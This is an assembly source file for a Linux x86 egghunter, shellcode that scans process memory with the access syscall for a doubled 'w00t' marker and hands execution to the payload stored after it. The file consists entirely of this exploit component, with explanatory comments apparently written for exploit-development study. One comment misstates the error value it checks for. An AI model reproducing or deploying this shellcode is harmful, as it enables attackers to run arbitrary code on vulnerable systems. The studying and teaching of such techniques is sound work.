global _start

section .text

_start:

xor ecx, ecx            ; null ecx
mul ecx                 ; null eax and edx

egghunt_loop_start:
or dx, 0xfff            ; page alignment so egghunter moves up in PAGE_SIZE increments.
                        ; A JMP taken to here moves up a page and checks if it's initialized.

scasd_zero:             ; a JMP taken here means the memory is valid and we are now searching for the egg
inc edx                 ; EDX holds the current memory address we are inspecting, it is incremented to a new memory location
lea ebx, [edx + 0x04]   ; load the address to be validated into EBX
push byte 0x21          ; PUSH POP access(2) syscall ID into EAX
pop eax
int 0x80                ; fire syscall to attempt memory validation

cmp al, 0xf2            ; Has AL returned 0xffffffff2 (-2)?
jz egghunt_loop_start   ; If so JMP to the start of the egghunt loop and move up a page
mov eax, 0x77303074     ; If not, Move egg into EAX, in this case it's 'w00t'
mov edi, edx            ; Move EDX into EDI
scasd                   ; Compare data at memory pointed to by EDX and EDI with EAX
jnz scasd_zero          ; If it does not match the egg, JMP to the inc EDX instruction in the egghunt loop (skipping the page realignment) and try again.
scasd                   ; Do the above again (the egg needs to appear twice)
jnz scasd_zero          ; Note that EDI is incremented by SCASD.
jmp edi                 ; If the egg appears twice in a row, pass execution to it.

